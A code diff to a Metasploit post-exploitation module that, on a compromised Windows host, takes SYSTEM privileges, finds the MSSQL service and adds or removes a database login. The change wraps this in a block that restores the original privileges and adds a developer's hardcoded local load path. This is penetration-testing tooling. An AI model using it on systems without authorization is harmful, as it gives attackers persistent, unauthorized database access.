@@ -6,7 +6,7 @@
 require 'msf/core'
 require 'rex'
 require 'msf/core/post/windows/mssql'
-
+load '/home/ben/git/metasploit-framework/lib/msf/core/post/windows/mssql.rb'
 class Metasploit3 < Msf::Post
 
   include Msf::Post::Windows::MSSQL
@@ -56,21 +56,22 @@ class Metasploit3 < Msf::Post
     # Get LocalSystem privileges
     system_status = get_system
     fail_with(Exploit::Failure::Unknown, 'Unable to get SYSTEM') unless system_status
+    begin
+      service = check_for_sqlserver(instance)
+      fail_with(Exploit::Failure::Unknown, 'Unable to identify MSSQL Service') unless service
 
-    service = check_for_sqlserver(instance)
-    fail_with(Exploit::Failure::Unknown, 'Unable to identify MSSQL Service') unless service
+      print_status("Identified service '#{service[:display]}', PID: #{service[:pid]}")
+      instance_name = service[:display].gsub('SQL Server (','').gsub(')','').lstrip.rstrip
 
-    print_status("Identified service '#{service[:display]}', PID: #{service[:pid]}")
-    instance_name = service[:display].gsub('SQL Server (','').gsub(')','').lstrip.rstrip
-
-    if datastore['REMOVE_LOGIN']
-      remove_login(service, instance_name)
-    else
-      add_login(service, instance_name)
+      if datastore['REMOVE_LOGIN']
+        remove_login(service, instance_name)
+      else
+        add_login(service, instance_name)
+      end
+    ensure
+      # attempt to return to original priv context
+      session.sys.config.revert_to_self
     end
-
-    # attempt to return to original priv context
-    session.sys.config.revert_to_self
   end
 
   def add_login(service, instance_name)
